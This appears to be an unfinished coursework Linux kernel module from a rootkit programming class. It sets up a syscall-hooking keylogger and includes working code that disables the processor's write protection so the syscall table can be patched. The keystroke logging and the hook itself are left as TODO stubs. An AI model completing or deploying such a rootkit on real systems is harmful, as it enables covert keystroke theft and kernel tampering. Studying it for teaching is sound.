/*
 * Assignment 01 for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/page.h>
#include "sysmap.h"

void **sys_call_table;

asmlinkage ssize_t (*original_read) (unsigned int fd, void *buf, size_t count);

/*
 * Our manipulated read syscall. It will print every keystroke to the syslog
 * and call the original read afterwards.
 */
asmlinkage ssize_t manipulated_read(unsigned int fd, void *buf, size_t count)
{
	// TODO: implement the keylogger
	return original_read(fd, buf, count);
}

/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection(void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (value & 0x00010000)
	{
		value &= ~0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
	}
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection(void)
{
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (!(value & 0x00010000))
	{
		value |= 0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
    	}
}

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and calls the print_nr_procs() function.
 */
int init_module(void)
{
	printk(KERN_INFO "Loading keylogger LKM...\n");
	
	/* get the location of the sys_call_table from our sysmap.h file */
	sys_call_table = (void*) sysmap_sys_call_table;

	/* disable the write-protection */
	disable_page_protection();
	
	// TODO
	//original_call = sys_call_table[];

	
	/* reenable the write-protection */
	enable_page_protection();	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message.
 */
void cleanup_module(void)
{
	printk(KERN_INFO "Unloading keylogger... bye!\n");
}
